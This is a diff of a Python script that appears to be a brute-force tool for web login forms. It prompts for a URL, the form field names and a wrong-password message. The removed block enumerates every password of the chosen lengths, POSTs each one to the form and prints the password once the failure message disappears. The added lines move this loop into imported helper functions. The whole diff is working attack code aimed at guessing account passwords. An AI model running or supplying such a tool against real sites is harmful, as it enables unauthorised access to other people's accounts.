@@ -1,5 +1,5 @@
 import requests
-from itertools import product
+from utils.functions import *
 from colorama import init, Fore
 
 
@@ -19,20 +19,12 @@ def main():
         usernameFormName = input("what is username name in html form: ")
         passwordFormName = input("what is password name in html form: ")
 
-        for length in range(minPassLength, maxPassLength + 1):
-            allPassPossible = product(passwordChars, repeat=length)
-            for tplItem in allPassPossible:
-                strTestingPass = "".join(tplItem)
-                print(f"testing password: {strTestingPass}")
-                data = {
-                    usernameFormName: username,
-                    passwordFormName: strTestingPass
-                }
-                response = requests.post(url, data=data)
-
-                if not wrongPassMessage in response.text:
-                    print(f"{Fore.RED}PASSWORD IS {strTestingPass}")
-                    return 0
+        for testingPassword in generatePassword(passwordChars, minPassLength, maxPassLength):            
+            print(f"testing password {testingPassword}")
+            testingResult = test(url, wrongPassMessage, usernameFormName=usernameFormName, passwordFormName=passwordFormName, username=username, testingPassword=testingPassword)
+            if testingResult:
+                print(f"{Fore.RED}PASSWORD IS {testingPassword}")
+                return
     elif userInput == "2":
         username = input("username: ")
         url = input("url: ")
